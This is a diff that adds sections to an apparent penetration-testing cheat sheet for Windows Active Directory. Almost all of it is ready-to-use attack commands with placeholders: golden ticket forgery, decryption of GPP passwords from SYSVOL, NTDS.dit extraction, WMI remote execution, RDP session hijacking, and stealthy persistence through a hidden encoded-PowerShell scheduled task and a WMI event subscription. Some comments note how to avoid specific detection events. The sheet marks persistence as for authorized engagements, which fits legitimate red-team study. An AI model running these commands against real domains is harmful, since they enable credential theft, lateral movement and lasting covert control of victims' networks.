@@ -214,6 +214,12 @@ kerbrute passwordspray -d <domain> --dc <ip_address> users.txt '<password>'   # 
 impacket-secretsdump <domain>/Administrator:<password>@<ip_address>
 impacket-secretsdump -just-dc <domain>/Administrator:<password>@<ip_address>
 # companion:end dcsync-secretsdump
+
+# Golden Ticket — own krbtgt (DCSync above) + domain SID -> forge a TGT offline, inject, use:
+# companion:gen golden-ticket
+impacket-ticketer -nthash <NThash> -domain-sid <domain-sid> -domain <domain> Administrator
+KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass <domain>/Administrator@<hostname>
+# companion:end golden-ticket
 ////////////////////////////////////////
 
 
@@ -270,6 +276,13 @@ nxc smb <ip_address>/24 -u <user> -p <password>     # spray a cred across the su
 nxc smb <ip_address>    -u <user> -H <NThash>       # pass-the-hash
 
 sudo mount -t cifs //<ip_address>/<share> /mnt -o username=<user>,password=<password>
+
+# GPP cpassword — any domain user can read+decrypt passwords left in SYSVOL XML (MS14-025):
+# companion:gen gpp-cpassword
+nxc smb <ip_address> -u <user> -p <password> -M gpp_password
+sudo mount -t cifs //<ip_address>/SYSVOL /mnt -o username=<user>,password=<password>
+gpp-decrypt <cpassword-blob>
+# companion:end gpp-cpassword
 ////////////////////////////////////////
 
 
@@ -374,6 +387,13 @@ DCSync / NTDS dump (needs DA or replication rights)
 impacket-secretsdump <domain>/<user>:<password>@<dc-ip> -just-dc              # all domain hashes
 impacket-secretsdump <domain>/<user>:<password>@<dc-ip> -just-dc-user krbtgt  # targeted (far quieter)
 nxc smb <dc-ip> -u <user> -p <password> --ntds                               # same, via nxc
+
+# Code-exec on the DC (not just repl rights)? copy NTDS.dit out of a shadow copy — no 4662:
+# companion:gen ntds-ntdsutil
+ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" q q
+nxc smb <ip_address> -u <user> -p <password> --ntds vss
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+# companion:end ntds-ntdsutil
 ////////////////////////////////////////
 
 
@@ -449,6 +469,12 @@ nxc smb <ip_address> -u <user> -H <NThash> -M lsassy          # remote LSASS -> 
 nxc smb <ip_address> -u <user> -p <password> --lsa            # LSA secrets
 impacket-psexec <domain>/<user>@<ip_address> -hashes :<NThash>
 evil-winrm -i <ip_address> -u <user> -H <NThash>
+# WMI exec — semi-interactive shell over DCOM, no service dropped (quieter on 7045):
+# companion:gen wmiexec-impacket
+impacket-wmiexec <domain>/<user>:<password>@<ip_address>
+impacket-wmiexec -hashes :<NThash> <domain>/<user>@<ip_address>
+nxc smb <ip_address> -u <user> -H <NThash> --exec-method wmiexec -x 'whoami'
+# companion:end wmiexec-impacket
 # Find a logged-on Domain Admin, then hijack their RDP session as SYSTEM:
 nxc smb <ip_address>/24 -u <user> -p <password> -x quser
 sc create hijack binpath= "cmd /k tscon <session-id> /dest:rdp-tcp#<n>" && net start hijack
@@ -470,6 +496,26 @@ installutil /logfile= /logtoconsole=false /u payload.dll
 # Persistence (AUTHORIZED only) — IFEO debugger on osk.exe -> SYSTEM shell from the lock screen:
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" \
     /v Debugger /t REG_SZ /d "cmd.exe"
+////////////////////////////////////////
+
+
+Persistence (authorized engagements only)
+++++++++++++++++++++++++++++++++++++++++
+# Reboot-surviving footholds. AUTHORIZED engagements only — record every artifact you
+# plant (task name, consumer name, host) in notes.md and remove it at the end. The blue
+# detections for these are in PURPLE-TEAM.md (4698 / Sysmon 19-21).
+
+# Scheduled task — triggered callback under an account you pick (SYSTEM if you can):
+# companion:gen schtask-persist
+schtasks /create /tn "Updater" /tr "powershell -w hidden -enc <b64>" /sc onlogon /ru SYSTEM
+nxc smb <ip_address> -u <user> -p <password> -M schtask_as -o CMD='whoami'
+# companion:end schtask-persist
+
+# WMI event subscription — fileless, no Run key / task; lives in the WMI repo, runs as SYSTEM:
+# companion:gen wmi-subscription
+nxc smb <ip_address> -u <user> -p <password> -M wmi-event -o CONSUMER='powershell -w hidden -enc <b64>'
+Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" -Action {iex(<payload>)}
+# companion:end wmi-subscription
 ////////////////////////////////////////
 
 
